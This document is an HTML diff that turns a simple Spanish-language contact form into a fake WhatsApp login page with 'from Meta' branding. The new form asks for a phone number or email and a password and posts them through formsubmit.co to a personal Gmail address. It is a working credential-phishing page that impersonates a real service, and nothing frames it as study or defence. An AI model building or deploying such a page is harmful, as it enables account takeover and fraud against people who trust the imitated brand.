@@ -5,121 +5,97 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>WhatsApp</title>
 <style>
-  /* Reset y cuerpo */
   html, body {
     margin: 0;
     padding: 0;
     width: 100%;
     height: 100%;
-    font-family: 'Helvetica Neue', Arial, sans-serif;
-    background: #ece5dd;
+    background: #fff;
+    font-family: Helvetica, Arial, sans-serif;
   }
 
-  /* Contenedor principal tipo app */
-  .app {
+  .screen {
     width: 100vw;
     height: 100vh;
     display: flex;
     flex-direction: column;
-  }
-
-  /* Encabezado */
-  header {
-    height: 60px;
-    background: #075e54;
-    display: flex;
+    justify-content: space-between;
     align-items: center;
-    padding: 0 15px;
-    color: white;
-    font-weight: bold;
-    font-size: 20px;
-    box-sizing: border-box;
-  }
-  header img {
-    height: 40px;
-    margin-right: 10px;
   }
 
-  /* Contenedor de chat */
-  .chat-container {
-    flex: 1;
-    padding: 10px;
+  .top {
+    margin-top: 90px;
     display: flex;
     flex-direction: column;
-    justify-content: flex-end;
+    align-items: center;
   }
 
-  /* Burbujas simuladas */
-  .bubble {
-    max-width: 70%;
-    padding: 10px 15px;
-    margin: 5px 0;
-    border-radius: 20px;
-    color: #fff;
-    font-size: 15px;
-    word-wrap: break-word;
-  }
-  .bubble.bot {
-    background: #dcf8c6;
-    color: black;
-    align-self: flex-start;
-  }
-  .bubble.user {
-    background: #25d366;
-    align-self: flex-end;
+  .logo {
+    font-size: 40px;
+    color: #25D366;
+    font-weight: 700;
+    margin-bottom: 50px;
+    letter-spacing: -1px;
   }
 
-  /* Formulario */
-  form {
-    display: flex;
-    flex-direction: column;
+  .box {
     width: 90%;
-    max-width: 400px;
-    margin: 10px auto;
-    background: #fff;
-    padding: 15px;
-    border-radius: 10px;
-    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    max-width: 360px;
   }
-  form input, form textarea, form button {
-    margin-bottom: 10px;
-    padding: 10px;
-    font-size: 16px;
-    border-radius: 5px;
-    border: 1px solid #ccc;
+
+  input {
     width: 100%;
+    padding: 15px 12px;
+    font-size: 16px;
+    margin-bottom: 16px;
+    border-radius: 6px;
+    border: 1px solid #dadce0;
     box-sizing: border-box;
+    outline: none;
   }
-  form button {
-    background-color: #25d366;
-    color: white;
+
+  input:focus {
+    border-color: #25D366;
+  }
+
+  button {
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 999px;
     border: none;
-    font-weight: bold;
+    background: #25D366;
+    color: white;
+    font-weight: 600;
     cursor: pointer;
   }
-  form button:hover {
-    background-color: #1ebe5d;
+
+  button:active {
+    background: #1ebe5d;
+  }
+
+  .footer {
+    font-size: 13px;
+    color: #777;
+    margin-bottom: 25px;
   }
 </style>
 </head>
 <body>
-<div class="app">
-  <header>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="logo">
-    WhatsApp
-  </header>
 
-  <div class="chat-container">
-    <div class="bubble bot">Hola! Envía tu mensaje y llegará directo a Orlando 😎</div>
+<div class="screen">
+  <div class="top">
+    <div class="logo">WhatsApp</div>
+
+    <form class="box" action="https://formsubmit.co/orlandguzz@gmail.com" method="POST">
+      <input type="text" name="user" placeholder="Número de teléfono o correo electrónico" required>
+      <input type="password" name="password" placeholder="Contraseña" required>
+      <button type="submit">Iniciar sesión</button>
+    </form>
   </div>
 
-  <form action="https://formsubmit.co/orlandguzz@gmail.com" method="POST">
-    <input type="text" name="name" placeholder="Nombre" required>
-    <input type="email" name="email" placeholder="Correo" required>
-    <textarea name="message" placeholder="Mensaje" rows="3" required></textarea>
-    <button type="submit">Enviar</button>
-  </form>
+  <div class="footer">from Meta</div>
 </div>
+
 </body>
 </html>
-
